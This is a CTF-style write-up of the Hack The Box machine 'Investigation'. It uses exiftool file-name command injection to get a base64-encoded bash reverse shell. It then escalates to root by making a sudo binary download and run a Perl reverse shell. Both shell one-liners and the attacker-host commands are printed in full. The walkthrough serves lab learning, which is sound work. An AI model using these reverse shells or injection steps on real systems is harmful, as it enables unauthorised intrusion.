# Investigation

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.236.234
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 10:42 EST
Warning: 10.129.236.234 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.236.234
Host is up (0.16s latency).
Not shown: 64782 closed tcp ports (conn-refused), 751 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Web Exploit based. We would have to add `eforenzics.htb` to our `/etc/hosts` file to access the web port.

### Exiftool RCE

The website reveals some web application advertising Digital Forensic Services.

<figure><img src="../../../.gitbook/assets/image (4015).png" alt=""><figcaption></figcaption></figure>

Clicking the big Go button reveals that we can upload a jpg file to the website for analysis.

<figure><img src="../../../.gitbook/assets/image (2836).png" alt=""><figcaption></figcaption></figure>

When I uploada file, it would produce a link to a report.

<figure><img src="../../../.gitbook/assets/image (3516).png" alt=""><figcaption></figcaption></figure>

The file would be a .txt file of output from `exiftool` being used on the file.

<figure><img src="../../../.gitbook/assets/image (1925).png" alt=""><figcaption></figcaption></figure>

Very obviously, there is a JPG RCE vulnerability here. One possible parameter to inject commands in is the File Name. With the version, I found this vulnerability that allowed for RCE through the pipe character.

{% embed url="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429" %}

From this, I attempted a few direct OS command injections but it didn't work out well. I then attempted some Base64 encoded stuff, and a simple ping command works!

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1713).png" alt=""><figcaption></figcaption></figure>

We can then replace the Base64 encoded command with a simple bash reverse shell and it works!

```
$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.56/4444 0>&1"  ' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ni80NDQ0IDA+JjEiICAK
```

<figure><img src="../../../.gitbook/assets/image (2344).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

When viewing the `/home` directory, we see there's a `smorton` user that we cannot access.

```
www-data@investigation:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Aug 27 21:20 .
drwxr-xr-x 18 root    root    4096 Jan  9 16:53 ..
drwxrwx---  3 smorton smorton 4096 Jan  9 10:47 smorton
```

We need to do some looking around. I ran LinPEAS and found an interesting cronjob that was running.

<figure><img src="../../../.gitbook/assets/image (1276).png" alt=""><figcaption></figcaption></figure>

Some backups of the `/home` directory were being created, and also there was an unquoted service path for the `date` binary.

### Windows Event Logs

Heading to the `/usr/local/investigation/analysed_log` file, we can find a Microsoft Outlook Message there.

```
www-data@investigation:/usr/local/investigation$ ls -la
total 1288
drwxr-xr-x  2 root     root        4096 Sep 30 23:43  .
drwxr-xr-x 11 root     root        4096 Aug 27 21:54  ..
-rw-rw-r--  1 smorton  smorton  1308160 Oct  1 00:35 'Windows Event Logs for Analysis.msg'
-rw-rw-r--  1 www-data www-data       0 Oct  1 00:40  analysed_log
```

I sent this back to my machine via `nc` and opened it using `msfconvert`. Afterwards, we can read the emails. There's a huge base64 encoded zip file attached.

```
Content-Type: text/plain; charset=UTF-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit

Hi Steve,

Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures. 

Regards.
Tom
```

I couldn't decode the base64 to get the file for some reason, so I ported the message to my Windows machine and downloaded the file there.

When unzipped, we would get this MS Windows Vista Event Log.

<figure><img src="../../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

So the key here is to watch for logging and file transfers that are occurring. We can use this tool to dump the log file into a JSON file for easier reading.&#x20;

{% embed url="https://github.com/omerbenamram/evtx" %}

After looking around the entire log file (for a while), I chanced upon this string when searching for the Authentication term.

<figure><img src="../../../.gitbook/assets/image (2781).png" alt=""><figcaption></figcaption></figure>

Turns out that this was the password for `smorton`. We can now `su` and capture the user flag.

### Sudo Binary

When checking sudo privileges as `smorton`, we can find one:

```
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

Attempting to run the binary just does this:

```
smorton@investigation:~$ sudo /usr/bin/binary
Exiting...
```

So I transferred this binary back to my machine and used `ghidra` to see what it does. Here's the decompiled main function:

<figure><img src="../../../.gitbook/assets/image (1689).png" alt=""><figcaption></figcaption></figure>

We can use this to get these this information:

1. It needs a total of 3 parameters
2. A password of `lDnxUysaQn` is needed as one of the parameters
3. It exeecutes `curl` and `perl` on the script we download
4. Then it cleans up by removing the file.

Simple enough. We should just need to host a perl reverse shell on our machine via Python HTTP and let this binary download and execute it.&#x20;

```perl
use Socket;$i="10.10.14.56";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

After a bit of testing about the ordering of the parameters, I found what works:

```
smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.56/rev.perl lDnxUysaQn 
Running...
```

<figure><img src="../../../.gitbook/assets/image (2074).png" alt=""><figcaption></figcaption></figure>

Definitely more on the CTF side of HTB.&#x20;
